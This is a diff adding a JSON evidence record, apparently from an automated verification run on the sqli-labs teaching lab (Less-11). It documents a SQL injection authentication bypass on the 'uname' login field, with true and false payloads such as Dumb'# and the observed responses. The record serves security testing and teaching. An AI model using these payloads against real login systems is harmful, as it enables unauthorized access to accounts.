@@ -1,0 +1,60 @@
+{
+  "run_id": "wp4-20261019-sqli002-low",
+  "sample_id": "SQLI-002",
+  "path_id": "Less-11/index.php:uname",
+  "condition_key": "env=sqli-labs-wsl-01|role=anonymous|security=n/a|object=teaching-user|state=initialized",
+  "observations": {
+    "endpoint": "/Less-11/index.php",
+    "parameter": "uname (POST), passwd held constant as a non-matching value",
+    "cases": {
+      "normal": {
+        "uname": "Dumb",
+        "status": 200,
+        "login_name": "Dumb",
+        "sql_error": "",
+        "has_flag_image": true,
+        "body_bytes": 1521
+      },
+      "true": {
+        "uname": "Dumb'#",
+        "status": 200,
+        "login_name": "Dumb",
+        "sql_error": "",
+        "has_flag_image": true,
+        "body_bytes": 1521
+      },
+      "false": {
+        "uname": "Dumb' AND '1'='2#",
+        "status": 200,
+        "login_name": "",
+        "sql_error": "",
+        "has_flag_image": false,
+        "body_bytes": 1435
+      }
+    },
+    "true_comment_bypasses_password": true,
+    "false_returns_no_row": true
+  },
+  "success_criteria": [
+    "The normal account/password pair logs in and shows the teaching row.",
+    "A comment sequence in uname returns the same account while the password is wrong.",
+    "The false condition returns no row with the same password value and endpoint.",
+    "Only uname is changed between true and false cases; passwd stays constant."
+  ],
+  "limitations": [
+    "Only Less-11's POST login query is covered.",
+    "This is a minimal authentication-bypass/boolean proof, not a data dump."
+  ],
+  "artifacts": [
+    {
+      "path": "verification/evidence/wp4-20261019-sqli002-low/request.redacted.json",
+      "sha256": "3e23850b826131129244a58f08775b1acf18584a25181983046d7f3dc04116e1",
+      "description": "request.redacted.json"
+    },
+    {
+      "path": "verification/evidence/wp4-20261019-sqli002-low/response.redacted.txt",
+      "sha256": "ba9cd9f2ce770e954bb999dfc4ef9e72e998d27fae2c5aa6c1383270f796d759",
+      "description": "response.redacted.txt"
+    }
+  ]
+}
